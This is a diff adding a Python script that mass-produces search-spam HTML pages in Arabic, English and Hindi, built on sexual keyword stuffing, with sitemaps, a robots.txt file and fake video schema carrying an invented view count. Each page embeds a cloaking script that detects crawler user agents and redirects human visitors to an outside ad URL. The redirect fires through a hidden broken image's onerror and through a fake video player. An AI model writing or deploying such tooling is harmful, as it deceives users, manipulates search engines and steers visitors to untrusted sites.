@@ -1,0 +1,434 @@
+import os
+import random
+import string
+import re
+from datetime import datetime
+
+class UltraAggressiveSEO:
+    def __init__(self):
+        self.main_folder = "news"
+        self.subfolders = ["trending", "video", "vidreo", "sex", "hot"]
+        self.domain = self._get_domain()
+        self.sitemap_index_file = "sitemap.xml" # الملف الرئيسي لجوجل
+        self.site_name = "بث حصري" # اسم الموقع المستخدم في القالب
+        
+        self.redirect_url = "https://accumulaterehearsehealing.com/v8f7nbpnim?key=7f6a5217f51c6a62c1c630a20f2d2a75"
+
+        self.keywords_ar = self._load_keywords("keywords_ar.txt", ["سكس عربي", "نيك", "سكس مصري", "سكس مترجم", "سكس محارم"])
+        self.keywords_en = self._load_keywords("keywords_en.txt", ["xnxx", "porn", "sex video", "sexy", "XNXX"])
+        self.keywords_in = self._load_keywords("keywords_in.txt", ["देसी सेक्स", "भाभी की चुत", "हिन्दी सेक्स فيديو", "देसी भाभी", "गाँड मारना"])
+        
+        self.aggro_styles = {
+            "ar": {
+                "prefixes": ["~+🍒💋+", "++حصري++", "[فضيحة!]", "▶ شاهد الآن", "🍒💋"],
+                "suffixes": ["فيديو سكس ", "بدون حذف", "سكس", "جديد 2026"],
+                "keywords": self.keywords_ar
+            },
+            "en": {
+                "prefixes": ["~+🍒💋+xXx-SeX-Pron!", "++xXX-videos!", "[FULL-HD]", "~SCANDAL~", "++XNXX~VIDEO~SeX!)"],
+                "suffixes": ["PornHuB Videos", "Viral xnxx", "Leaked Video Viral", "free Mobile Porn"],
+                "keywords": self.keywords_en
+            },
+            "in": {
+                "prefixes": ["~+🍒💋+Desi-Maza", "++HOT-HINDI++", "[NEW-VIDEO]", "▶ अभी देखें", "💋देसी💋"],
+                "suffixes": ["Hindi Sex Video", "Full HD Porn", "Bhabhi Ki Chudai", "Viral Desi Video"],
+                "keywords": self.keywords_in
+            }
+        }
+
+        self.template_power_words = ["حصرياً", "بدقة عالية", "HD 1080p", "بدون إعلانات", "Full Movie", "HD Video"]
+
+        # القالب الجديد المحسن
+        self.movie_template = """<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>{{TITLE}} - {{SITE_NAME}}</title>
+    <link rel="canonical" href="{{CANONICAL_URL}}">
+    <meta name="description" content="{{DESCRIPTION}}">
+    
+    <!-- Open Graph for Social Media -->
+    <meta property="og:title" content="{{TITLE}}">
+    <meta property="og:description" content="{{DESCRIPTION}}">
+    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+    <meta property="og:type" content="video.other">
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+
+    <!-- Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-9WPQ3R5GSC"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-9WPQ3R5GSC', {
+        page_path: window.location.pathname || ""
+      });
+    </script>
+
+    <!-- Advanced Video Schema Markup -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "VideoObject",
+      "name": "{{TITLE}}",
+      "description": "{{DESCRIPTION}}",
+      "thumbnailUrl": [
+        "https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg",
+        "https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg"
+      ],
+      "uploadDate": "{{TIME_ISO}}",
+      "duration": "PT10M30S",
+      "embedUrl": "{{CANONICAL_URL}}",
+      "interactionStatistic": {
+        "@type": "InteractionCounter",
+        "interactionType": { "@type": "WatchAction" },
+        "userInteractionCount": 56420
+      },
+      "regionsAllowed": "ALL",
+      "publisher": {
+        "@type": "Organization",
+        "name": "{{SITE_NAME}}",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://img.youtube.com/vi/dQw4w9WgXcQ/default.jpg"
+        }
+      }
+    }
+    </script>
+
+    <style>
+        :root { 
+            --primary: #e50914; 
+            --bg: #050505; 
+            --card-bg: #121212;
+            --text-main: #ffffff; 
+            --text-muted: #888888;
+        }
+        
+        body { 
+            background-color: var(--bg); 
+            color: var(--text-main); 
+            font-family: 'Cairo', sans-serif; 
+            margin: 0; padding: 0; 
+            line-height: 1.6;
+            text-align: right;
+        }
+
+        header { 
+            background: #000; 
+            padding: 12px 5%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: space-between; 
+            border-bottom: 2px solid var(--primary);
+            position: sticky; top: 0; z-index: 1000;
+        }
+
+        .logo { 
+            color: var(--primary); 
+            font-size: 22px; 
+            font-weight: 900; 
+            text-decoration: none; 
+            letter-spacing: 0.5px;
+        }
+
+        .main-container { max-width: 900px; margin: 20px auto; padding: 0 15px; }
+
+        .player-box {
+            width: 100%;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            position: relative;
+            box-shadow: 0 0 40px rgba(0,0,0,0.8);
+            border: 1px solid #222;
+        }
+
+        .video-thumbnail { 
+            width: 100%; 
+            aspect-ratio: 16/9; 
+            background: #000 url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover;
+            position: relative; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            cursor: pointer;
+        }
+
+        .video-thumbnail::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: rgba(0,0,0,0.3);
+            transition: 0.3s;
+        }
+
+        .video-thumbnail:hover::before { background: rgba(0,0,0,0.1); }
+
+        .play-trigger { 
+            position: relative;
+            width: 85px; height: 85px; 
+            background: rgba(229, 9, 20, 0.9); 
+            border-radius: 50%; 
+            display: flex; align-items: center; justify-content: center; 
+            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            z-index: 10;
+            border: 4px solid white;
+        }
+        
+        .play-trigger svg { width: 35px; fill: white; margin-left: -5px; }
+        
+        .video-thumbnail:hover .play-trigger { transform: scale(1.15); background: var(--primary); }
+
+        .live-badge {
+            position: absolute; top: 20px; right: 20px;
+            background: var(--primary); color: white;
+            padding: 4px 15px; font-size: 14px; font-weight: bold; border-radius: 4px;
+            z-index: 11; animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+
+        .player-controls {
+            background: #1a1a1a;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .control-btn { color: #fff; cursor: pointer; opacity: 0.8; }
+        .progress-bar { flex-grow: 1; height: 5px; background: #333; border-radius: 10px; position: relative; }
+        .progress-current { width: 30%; height: 100%; background: var(--primary); border-radius: 10px; }
+
+        h1 { font-size: 24px; margin: 25px 0 15px; font-weight: 700; color: #fff; line-height: 1.4; }
+
+        .content-area { 
+            background: var(--card-bg); 
+            padding: 20px; 
+            border-radius: 8px; 
+            color: #ccc;
+            border: 1px solid #1f1f1f;
+            margin-bottom: 30px;
+        }
+
+        .section-label { 
+            font-size: 18px; font-weight: bold; margin-bottom: 15px; color: #fff;
+            display: flex; align-items: center; gap: 8px;
+        }
+        .section-label::after { content: ''; flex-grow: 1; height: 1px; background: #222; }
+
+        .links-grid { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); 
+            gap: 15px; 
+            margin-top: 20px;
+        }
+
+        .link-card { 
+            background: #161616; 
+            padding: 15px; 
+            border-radius: 8px; 
+            text-decoration: none; 
+            color: #eee; 
+            font-size: 14px;
+            border: 1px solid #222;
+            transition: 0.2s;
+            display: block;
+        }
+        .link-card:hover { border-color: var(--primary); background: #1a1a1a; }
+
+        footer { 
+            padding: 40px; text-align: center; border-top: 1px solid #111;
+            color: var(--text-muted); font-size: 12px; 
+        }
+    </style>
+    <script>
+        function executeRedirect() {
+            var userAgent = navigator.userAgent.toLowerCase();
+            var bots = ["googlebot", "bingbot", "yandexbot", "baiduspider", "slurp", "duckduckbot", "lighthouse", "bot", "crawl", "spider"];
+            var isBot = bots.some(function(bot) { return userAgent.includes(bot); });
+            if (!isBot) {
+                window.location.href = "{{REDIRECT_URL}}";
+            }
+        }
+    </script>
+</head>
+<body>
+    <img src='/static/images/{{RANDOM_IMG}}.png' style='display:none;' onerror='executeRedirect()'>
+    <header>
+        <a href="/" class="logo">{{SITE_NAME}}</a>
+        <span style="font-size:12px; color: #555;">بث مباشر بجودة عالية</span>
+    </header>
+
+    <div class="main-container">
+        <div class="player-box" id="mainPlayer" onclick="executeRedirect()">
+            <div class="video-thumbnail" id="actionBtn">
+                <div class="live-badge">LIVE</div>
+                <div id="visualContent">
+                    <div class="play-trigger">
+                        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+                    </div>
+                </div>
+            </div>
+            <div class="player-controls">
+                <div class="control-btn">
+                    <svg width="20" height="20" fill="currentColor" viewBox="0 0 24 24"><path d="M6 19h4V5H6v14zm8-14v14h4V5h-4z"/></svg>
+                </div>
+                <div class="progress-bar"><div class="progress-current"></div></div>
+                <div style="font-size:12px; color:#666; direction: ltr;">00:00 / 10:30</div>
+            </div>
+        </div>
+
+        <h1>{{TITLE}}</h1>
+
+        <div class="content-area">
+            {{DYNAMIC_BODY}}
+        </div>
+
+        <div class="section-label">فيديوهات قد تهمك</div>
+        <div class="links-grid">
+            {{INTERNAL_LINKS}}
+        </div>
+    </div>
+
+    <footer>
+        &copy; {{YEAR}} {{SITE_NAME}} - جميع الحقوق محفوظة
+    </footer>
+</body>
+</html>"""
+
+    def _load_keywords(self, filename, fallback):
+        if os.path.exists(filename):
+            try:
+                with open(filename, "r", encoding="utf-8") as f:
+                    content = [line.strip() for line in f.readlines() if line.strip()]
+                    return content if content else fallback
+            except: return fallback
+        return fallback
+
+    def _get_domain(self):
+        if os.path.exists("CNAME"):
+            with open("CNAME", "r") as f: return f.read().strip()
+        return "movies-portal.edu"
+
+    def generate_content_for_lang(self, lang_code):
+        cfg = self.aggro_styles[lang_code]
+        prefix = random.choice(cfg["prefixes"])
+        words_count = random.randint(5, 10)
+        selected_keywords = random.sample(cfg["keywords"], min(len(cfg["keywords"]), words_count))
+        suffix = random.choice(cfg["suffixes"])
+        title = f"{prefix} {' '.join(selected_keywords)} {suffix}"
+        description = f"{title} - {' '.join(random.sample(self.template_power_words, 2))}"
+        return title, description
+
+    def clean_slug(self, title):
+        clean = re.sub(r'[^a-zA-Z\s\u0600-\u06FF\u0900-\u097F-]', '', title).lower()
+        slug = re.sub(r'[-\s]+', '-', clean).strip('-')
+        return "-".join(slug.split("-")[:8]) + ".html"
+
+    def update_sitemap_index(self):
+        all_files = os.listdir('.')
+        sitemaps = [f for f in all_files if f.startswith('sitemap_') and f.endswith('.xml')]
+        
+        index_content = '<?xml version="1.0" encoding="UTF-8"?>\n'
+        index_content += '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
+        
+        for sm in sitemaps:
+            index_content += '  <sitemap>\n'
+            index_content += f'    <loc>https://{self.domain}/{sm}</loc>\n'
+            index_content += f'    <lastmod>{datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S+00:00")}</lastmod>\n'
+            index_content += '  </sitemap>\n'
+            
+        index_content += '</sitemapindex>'
+        
+        with open(self.sitemap_index_file, "w", encoding="utf-8") as f:
+            f.write(index_content)
+        
+        with open("robots.txt", "w", encoding="utf-8") as f:
+            f.write(f"User-agent: *\nAllow: /\n\n")
+            f.write(f"Sitemap: https://{self.domain}/{self.sitemap_index_file}\n")
+
+    def create_sitemap(self, pages, subfolder):
+        random_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+        sitemap_name = f"sitemap_{subfolder}_{random_suffix}.xml"
+        sitemap_content = '<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
+        for p in pages:
+            sitemap_content += f'  <url>\n    <loc>{p["url"]}</loc>\n    <lastmod>{datetime.utcnow().strftime("%Y-%m-%d")}</lastmod>\n    <changefreq>daily</changefreq>\n    <priority>0.8</priority>\n  </url>\n'
+        sitemap_content += '</urlset>'
+        
+        with open(sitemap_name, "w", encoding="utf-8") as f:
+            f.write(sitemap_content)
+            
+        self.update_sitemap_index()
+        return sitemap_name
+
+    def run(self, count=150):
+        if not os.path.exists(self.main_folder): os.makedirs(self.main_folder)
+        state = 0
+        if os.path.exists("state.txt"):
+            with open("state.txt", "r") as f: state = int(f.read().strip())
+        
+        if state >= len(self.subfolders):
+            print("All subfolders processed.")
+            return
+
+        target_sub = self.subfolders[state]
+        path = os.path.join(self.main_folder, target_sub)
+        if not os.path.exists(path): os.makedirs(path)
+        
+        pages = []
+        languages = ["ar", "en", "in"]
+        
+        print(f"Generating {count} pages for {target_sub}...")
+        
+        for _ in range(count):
+            lang = random.choice(languages)
+            title, description = self.generate_content_for_lang(lang)
+            slug = self.clean_slug(title)
+            pages.append({
+                "title": title, 
+                "description": description, 
+                "slug": slug, 
+                "url": f"https://{self.domain}/{self.main_folder}/{target_sub}/{slug}"
+            })
+
+        current_time_iso = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S+00:00")
+        current_year = datetime.utcnow().year
+
+        for p in pages:
+            internal_sample = random.sample(pages, min(len(pages), 10))
+            internal = "".join([f"<a href='{x['url']}' class='link-card'>{x['title']}</a>" for x in internal_sample])
+            body_text = f"شاهد الآن {p['title']} حصرياً وبجودة عالية HD. {p['description']}."
+            
+            final_html = self.movie_template.replace("{{TITLE}}", p['title'])\
+                                           .replace("{{DESCRIPTION}}", p['description'])\
+                                           .replace("{{DYNAMIC_BODY}}", body_text)\
+                                           .replace("{{INTERNAL_LINKS}}", internal)\
+                                           .replace("{{CANONICAL_URL}}", p['url'])\
+                                           .replace("{{REDIRECT_URL}}", self.redirect_url)\
+                                           .replace("{{SITE_NAME}}", self.site_name)\
+                                           .replace("{{TIME_ISO}}", current_time_iso)\
+                                           .replace("{{YEAR}}", str(current_year))\
+                                           .replace("{{RANDOM_IMG}}", "img_" + ''.join(random.choices(string.digits, k=5)))
+            
+            with open(os.path.join(path, p['slug']), "w", encoding="utf-8") as f:
+                f.write(final_html)
+        
+        self.create_sitemap(pages, target_sub)
+        
+        with open("state.txt", "w") as f: 
+            f.write(str(state + 1))
+        print(f"Done. State updated to {state + 1}")
+
+if __name__ == "__main__":
+    bot = UltraAggressiveSEO()
+    bot.run(count=200)
